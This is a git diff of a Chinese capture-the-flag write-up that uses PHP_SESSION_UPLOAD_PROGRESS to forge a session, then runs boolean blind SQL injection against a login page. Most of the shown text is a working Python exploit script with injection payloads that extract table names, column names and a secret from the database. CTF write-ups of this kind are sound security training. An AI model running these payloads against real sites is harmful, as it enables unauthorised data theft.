@@ -4,6 +4,10 @@
 
 ## 考点
 
+* PHP\_SESSION\_UPLOAD\_PROGRESS伪造session
+* PHP\_SESSION\_UPLOAD\_PROGRESS结合session配置进行盲注
+* SQL盲注
+
 ## wp
 
 F12发现提示`/source.zip`，访问得到源码。
@@ -54,7 +58,7 @@ home是只返回一个静态页面。
 
 那可以通过PHP\_SESSION\_UPLOAD\_PROGRESS上传一个session，在templates/login.php页面进行盲注即可
 
-```
+```python
 #coding=utf-8 
 import io
 import requests
@@ -62,27 +66,41 @@ import time
 
 
 sessid = 'peri0d'
-url = 'http://0ac378b0-b87d-4881-a72b-ed216904678e.node4.buuoj.cn:81/templates/login.php'
+url = 'http://05c435b5-beb2-4fc3-92fe-249878699d61.node4.buuoj.cn:81/templates/login.php'
 s = requests.session()
 while True:
     f = io.BytesIO(b'a' * 1024 * 50)
     flag = ''
     for i in range(1, 50):
         print(flag)
-        for j in range(255):
+        
+        low = 0
+        high = 255
+        mid = (low+high)//2
+        while low < high:
             payload = {
-            'username': f'1" or (ascii(mid(select database(),{i},1))={j})#',
+            # flag_tbl,ptbctf
+            # 'username': f'1" or (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))>{mid})#',
+            # secret
+            # 'username': f'1" or (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name="flag_tbl")),{i},1))>{mid})#',
+            'username': f'1" or (ascii(substr((select(group_concat(secret))from(flag_tbl)),{i},1))>{mid})#',
             'password': '111'
             
             }
             r = s.post(url=url, data={'PHP_SESSION_UPLOAD_PROGRESS': '123456'}, files={'file': ('peri0d.txt',f)}, cookies={'PHPSESSID': sessid}, params=payload)
-            # print(r.text)
-            time.sleep(0.1)
-            if 'meta' in r.text:
-                flag = flag + chr(j)
+
+            
+            time.sleep(0.5)
+            
+            # true
+            if '<meta' in r.text:
+                low = mid + 1
+            # false
+            if 'Try again' in  r.text:
+                high = mid
+            mid = (low+high)//2
+            
+            if low == high:
+                flag = flag + chr(low)
                 break
-
-
-
-
 ```
